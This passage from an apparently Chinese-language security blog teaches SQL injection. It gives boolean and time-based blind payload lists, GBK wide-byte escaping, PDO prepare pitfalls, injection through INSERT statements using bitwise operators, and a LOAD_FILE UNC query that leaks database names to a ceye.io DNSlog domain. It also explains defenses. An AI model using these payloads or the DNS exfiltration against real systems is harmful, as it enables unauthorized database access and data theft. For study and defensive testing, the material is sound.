regexp&#39;^s&#39; |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             0 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;n$&#39;;</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| (select name from math where id&#x3D;3) regexp&#39;n$&#39; |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             1 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;an$&#39;;</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">| (select name from math where id&#x3D;3) regexp&#39;an$&#39; |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">|                                              1 |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regexp &#39;^[a-z]&#39;  #判断一个表的第一个字符串是否在a-z中</span><br><span class="line">regexp &#39;^r&#39;      #判断第一个字符串是否为r</span><br><span class="line">regexp &#39;^r[a-z]&#39; #判断一个表的第二个字符串是否在a-z中(这里可以使用二分法)</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>提高盲注速度</p><p>DNSlog+盲注</p><p><code>https://wooyun.js.org/drops/%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%BD%BF%E7%94%A8DNS%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html</code></p><p>原理：</p><p>Dnslog就是存储在DNS Server上的域名信息，它记录着用户对域名<a href="http://www.test.com、t00ls.com.等的访问信息./">www.test.com、t00ls.com.等的访问信息。</a></p><p>通过合适的sql语句，在数据库中执行之后，一条带有数据库查询结果的域名就被提交到DNS服务器进行解析。</p><p>可以查看DNS服务器上的Dnslog就可以得到SQL注入结果。<a href="http://ceye.io上我们可以获取到有关`ceye.io`的dns查询信息./">http://ceye.io上我们可以获取到有关`ceye.io`的DNS查询信息。</a></p><p>在域名解析的过程中，是由顶级域名向下逐级解析的，我们构造的攻击语句也是如此，当它发现域名中存在<code>ceye.io</code>时，它会将这条域名信息转到相应的NS服务器上，而通过<a href="http://ceye.io我们就可以查询到这条dns解析记录./">http://ceye.io我们就可以查询到这条DNS解析记录。</a></p><p>Microsoft SQL Server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用Microsoft Windows通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析。UNC命名被应用于在局域网中访问文件服务器或者打印机，Windows系统的UNC语法具有通用的形式：  \\ComputerName\SharedFolder\Resource</span><br><span class="line"></span><br><span class="line">攻击者能够通过使用自定义制作的地址作为计算机名字段的值引发DNS请求。</span><br></pre></td></tr></table></figure><p>  条件：</p><p>  1、secure_file_priv为空</p><p>  2、目标系统是windows，能够使用UNC路径</p><p>  实例：</p><p>  构造sql语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(select database(),&#39;mysql.cmr1ua.ceye.io\\abc&#39;)))</span><br></pre></td></tr></table></figure><p>四个\，其中两个用来转义。<br>DNSlog平台接受信息<br><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200911100714531.png" alt="image-20200911100714531"></p></li></ul><h6 id="常用payload-1"><a href="#常用payload-1" class="headerlink" title="常用payload"></a>常用payload</h6><p>布尔盲注</p><p>判断数据库的类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//判断是否是 Mysql数据库</span><br><span class="line">1&#x27; and exists(<span class="keyword">select</span>*<span class="keyword">from</span> information_schema.tables) <span class="comment">#</span></span><br><span class="line">//判断是否是 <span class="keyword">access</span>数据库</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and exists(select*from msysobjects) #</span></span><br><span class="line"><span class="string">//判断是否是 Sqlserver数据库</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span>*<span class="keyword">from</span> sysobjects) <span class="comment">#</span></span><br><span class="line">//判断是否是<span class="keyword">Oracle</span>数据库</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(*) from dual)&gt;0 #</span></span><br></pre></td></tr></table></figure><p>判断数据库长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length(database())&gt;5 </span><br></pre></td></tr></table></figure><p>判断数据库的名字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and ascii(substr(database(),1,1))&gt;100</span><br></pre></td></tr></table></figure><p>判断数据库中是否存在某个表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and exists(select*from admin)</span><br></pre></td></tr></table></figure><p>判断数据库中表的数量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&gt;5 #</span><br></pre></td></tr></table></figure><p>判断数据库中表的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&#x3D;6</span><br></pre></td></tr></table></figure><p>判断数据库中表的名字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;100 #</span><br></pre></td></tr></table></figure><p>判断数据库中的表中是否存在某个字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and exists(select username from admin)</span><br></pre></td></tr></table></figure><p>判断数据库中的表的字段的数量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and (select count(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;)&gt;5 #</span><br></pre></td></tr></table></figure><p>判断数据库中表的字段的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1))&gt;5</span><br></pre></td></tr></table></figure><p>判断数据库中表的字段的名字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1,1))&gt;100</span><br></pre></td></tr></table></figure><p>判断字段中的数据的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length((select id from users limit 0,1))&gt;5</span><br></pre></td></tr></table></figure><p>判断字段中的数据的值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">100</span></span><br></pre></td></tr></table></figure><p>时间盲注</p><p>判断时间盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and sleep(5)<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>判断数据库的长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(database())=5,1,sleep(5)) <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>判断数据库的名字</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(ascii(substring(database(),1,1))&lt;100,1,sleep(5)) #</span><br></pre></td></tr></table></figure><p>同理数据库的表、字段、值。</p><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>造成宽字节注入的原因是编码转换，应用程序的编码与数据库的编码不一致，编码转换导致的引号逃逸。</p><p>GBK双字节编码：一个汉字用两个字节表示，首字节对应0x81-0xFE，尾字节对应0x40-0xFE（除0x7F），刚好涵盖了对应的编码0x5C。</p><p>比如客户端php的编码为UTF-8，而mysql通过set name ‘GBK’设置编码，导致两者的编码不一样，在进行编码转换的时候出现了宽字节注入。</p><p>应用程序的编码</p><p>以php为例子，使用者输入数据后，会通过php的默认编码生成sql语句发送给服务器。在php没有开启<code>default_charset</code>编码时，php的默认编码为空，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; PHP&#39;s built-in default is text&#x2F;html</span><br><span class="line">default_mimetype &#x3D; &quot;text&#x2F;html&quot;</span><br><span class="line">;default_charset &#x3D; &quot;iso-8859-1&quot;</span><br></pre></td></tr></table></figure><p>此时php会根据数据库中的编码自动来确定使用那种编码，可以使用<code>&lt;?php $m=&quot;字&quot;; echo strlen($m);?&gt;</code> 来进行判断，如果输出的值是3说明是<code>utf-8</code>编码。如果输出的值是2说明是<code>gbk</code>编码；</p><p><code>SET NAMES &#39;GBK&#39;</code>语句与这三个语句等价：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;SET character_set_client &#x3D;&#39;GBK&#39;;</span><br><span class="line">mysql&gt;SET character_set_results &#x3D;&#39;GBK&#39;;</span><br><span class="line">mysql&gt;SET character_set_connection &#x3D;&#39;GBK&#39;;</span><br></pre></td></tr></table></figure><p>三个语句的作用是：</p><p>当我们的mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。</p><p>当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。</p><p>使用<code>addslashes</code>函数或是开启<code>PHPGPC</code>（注：<code>在php5.4已上已给删除</code>，并且需要说明特别说明一点，GPC无法过滤<code>$_SERVER</code>提交的参数）时过滤GET、POST、COOKIE、REQUSET 提交的参数时，我们使用的预定义字符会给转义成添加反斜杠的字符串如下面的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">单引号（&#39;）&#x3D; （\&#39;）</span><br><span class="line">双引号（&quot;） &#x3D; （\&quot;）</span><br><span class="line">反斜杠（\） &#x3D; （\\）</span><br></pre></td></tr></table></figure><p>比如我们输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;%df%27</span><br></pre></td></tr></table></figure><p>会被进行如下转换</p><p>%df%27===(addslashes)===&gt;%df%5c%27===(数据库GBK)===&gt;運’ </p><p>因为数据库设置了<code>GBK</code>编马，即是在汉字编码范围内两个字节都会给重新编码为一个汉字。即是<code>%df%5c</code>转换成了汉字<code>運</code>，而单引号就逃逸了出来，从而造成了注入漏洞。</p><p>防御：</p><p>对于宽字节编码，有一种最好的修补就是：</p><p>（1）使用mysql_set_charset(GBK)指定字符集</p><p>（2）使用mysql_real_escape_string进行转义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面%df和5c拼接为一个宽字节的问题，就是使用mysql_set_charset进行指定，他会指定当前连接的字符集。</span><br></pre></td></tr></table></figure><p>（3）character_set_client设置成binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。</p><h4 id="PDO技术"><a href="#PDO技术" class="headerlink" title="PDO技术"></a>PDO技术</h4><p>mysql的预编译</p><p>当采用预编译操作时，首先将待执行的SQL，语句中的参数值用占位符替代。当带着占位符的SQL<br>语句模板被数据库编译、解析后，再通过向占位符绑定参数进行查询操作。</p><p>模拟预处理</p><p>模拟预编译是防止某些数据库不支持预编译而设置的(如sqllite与低版本mysql)。如果模拟预处理开启，那么客户端程序内部会模拟mysql数据库中的参数绑定这一过程。也就是说，程序会在内部模拟prepare的过程，当执行execute时，再将拼接后的完整SQL语句发送给mysql数据库执行</p><p>模拟预处理并没有实现SQL模板与参数的分离，但的确可以防止sql注入。模拟预处理防止sql注入的本质是在参数绑定过程中对参数值进行转义与过滤,这一点与真正的sql数据库预处理是不一样的。理论上，sql数据库预编译更加安全一些。</p><p>非模拟预处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PDO::ATTR_EMULATE_PREPARES =&gt; <span class="literal">false</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$params = [</span><br><span class="line">    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,</span><br><span class="line">    PDO::ATTR_EMULATE_PREPARES  =&gt; <span class="literal">false</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:dbname=cat;host=127.0.0.1;&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, $params);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $link = $db-&gt;prepare(<span class="string">&#x27;SELECT * FROM table2 WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (\PDOException $e) &#123;</span><br><span class="line">    var_dump($e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里使用非模拟预编，非模拟预编译不会像模拟预编呢样在PDO内部会模拟参数绑定的过程，</p><p>非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing-&gt;resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization-&gt;execution）。</p><p>在发送带有占位符的sql语句到数据库的时候这时候就已经发生了错误。进行了报错。</p><p>预编译可以完全杜绝注入攻击吗</p><p>在预编译阶段即prepare阶段，sql语句的模板中参数名可控，导致的sql注入。</p><p>总结</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、使用PDO时尽量使用非模拟预处理。</span><br><span class="line">2、创建PDO实例时将PDO::MYSQL_ATTR_MULTI_STATEMENTS设置为false，禁止多语句查询。</span><br><span class="line">3、SQL语句模板不使用变量动态拼接生成</span><br></pre></td></tr></table></figure><p>关于orderby不能参数化查询的问题</p><p>原因：</p><ul><li><p>order by后面拼接字段名，字段名不能加引号。</p></li><li><p>在进行预编译的时候，我们替换占位符的时候字段串会自动加上引号，比如java的setString方法。</p></li></ul><h5 id="insert、update注入"><a href="#insert、update注入" class="headerlink" title="insert、update注入"></a>insert、update注入</h5><h6 id="利用报错注入"><a href="#利用报错注入" class="headerlink" title="利用报错注入"></a>利用报错注入</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insert into steady(p_name,p_number,p_owner,p_ney,sqdate) values( &#39;te1st&#39;,&#39;51&#39;,&#39;Olivia&#39; or 注入语句</span><br><span class="line"> or&#39;&#39;,&#39;test123&#39;,&#39;1511241494&#39;) -- </span><br></pre></td></tr></table></figure><h6 id="无回显注入-盲注"><a href="#无回显注入-盲注" class="headerlink" title="无回显注入(盲注)"></a>无回显注入(盲注)</h6><ul><li><p>利用xor、||、&amp;&amp;、+,-,*,/</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (sleep(10));</span><br><span class="line">+-------------+</span><br><span class="line">| (sleep(10)) |</span><br><span class="line">+-------------+</span><br><span class="line">|           0 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (10.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into steady values (0 &amp;&amp; sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (1 &amp;&amp; sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (2.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (0 || sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (2.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (1 || sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (0 xor sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (2.09 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (1 xor sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (2.01 sec)</span><br></pre></td></tr></table></figure><p>配合if、substr等函数进行盲注。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into  math values(0 || if(substr(user(),1,1)&#x3D;&#39;r&#39;,sleep(0),sleep(10)),&#39;444&#39;);</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into  math values(0 || if(substr(user(),1,1)&#x3D;&#39;b&#39;,sleep(0),sleep(10)),&#39;444&#39;);</span><br><span class="line">Query OK, 1 row affected (10.00 sec)</span><br></pre></td></tr></table></figure></li></ul><h6 id="有回显注入-符号"><a href="#有回显注入-符号" class="headerlink" title="有回显注入(符号)"></a>有回显注入(符号)</h6><ul><li><p>实例：</p><p>按位或、按位异或受收到字段类型的限制，比如一下表中的id字段，id字段只允许10个长度，我们想要的数据有时候超过10个长度。</p><p>这时候我们需要使用substr函数去截取制定的字段，然后在使用hex。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">#int型按位或</span><br><span class="line">mysql&gt; insert into steady values (0 | (select hex(database())),&#39;0&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from steady;</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">| userid   | username | signature | mood |</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">| 74657374 | 0        | test      | 0    |</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(74657374);</span><br><span class="line">+-----------------+</span><br><span class="line">| unhex(74657374) |</span><br><span class="line">+-----------------+</span><br><span class="line">| test            |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">#int型按位异或</span><br><span class="line">mysql&gt; insert into ctf values (100 ^ (select hex(database())),&#39;0&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf;</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">| userid   | username | signature | mood |</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">| 74657338 | 0        | test      | 0    |</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(100^74657338);</span><br><span class="line">+---------------------+</span><br><span class="line">| unhex(100^74657338) |</span><br><span class="line">+---------------------+</span><br><span class="line">| test                |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#字符型按位或</span><br><span class="line">mysql&gt; insert into ctf values (100 ,&#39;0&#39;| (select hex(database())) ,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf;</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">|    100 | 74657374 | test      | 0    |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(74657374);</span><br><span class="line">+-----------------+</span><br><span class="line">| unhex(74657374) |</span><br><span class="line">+-----------------+</span><br><span class="line">| test            |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">#字符型按位异或</span><br><span class="line">mysql&gt; insert into ctf values (100 ,&#39;100&#39; ^ (select hex(database())) ,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf;</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">|    100 | 74657338 | test      | 0    |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select unhex(&#39;100&#39;^74657338);</span><br><span class="line">+-----------------------+</span><br><span class="line">| unhex(&#39;100&#39;^74657338) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| test                  |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>mysql运算符</p><ul><li><p>按位或运算符–｜</p><p>0与任意的数字b或都为b</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; mysql&gt; select (0|1);</span><br><span class="line">+-------+</span><br><span class="line">| (0|1) |</span><br><span class="line">+-------+</span><br><span class="line">|     1 |</span><br><span class="line">+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (0|2323);</span><br><span class="line">+----------+</span><br><span class="line">| (0|2323) |</span><br><span class="line">+----------+</span><br><span class="line">|     2323 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (0|452323);</span><br><span class="line">+------------+</span><br><span class="line">| (0|452323) |</span><br><span class="line">+------------+</span><br><span class="line">|     452323 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>按位异或运算符–^</p><ul><li><p>0与任意的数字b异或都是b</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (0^452323);</span><br><span class="line">+------------+</span><br><span class="line">| (0^452323) |</span><br><span class="line">+------------+</span><br><span class="line">|     452323 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (0^5644);</span><br><span class="line">+----------+</span><br><span class="line">| (0^5644) |</span><br><span class="line">+----------+</span><br><span class="line">|     5644 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>其他数字a与任意数字b异或得到c</p><p>可以通过c与a异或得到b，通常b是我们sql注入想要的数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (10^5644);</span><br><span class="line">+-----------+</span><br><span class="line">| (10^5644) |</span><br><span class="line">+-----------+</span><br><span class="line">|      5638 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (10^5638);</span><br><span class="line">+-----------+</span><br><span class="line">| (10^5638) |</span><br><span class="line">+-----------+</span><br><span class="line">|      5644 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h5 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h5><p>1、mysql的网站注入，5.0以上和5.0以下有什么区别？</p><p>MySQL 5.0以上版本， 5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</p><p> 5.0以下是多用户单操作，5.0以上是多用户多操做。</p></li></ul>]]></content>
    
    
      
      
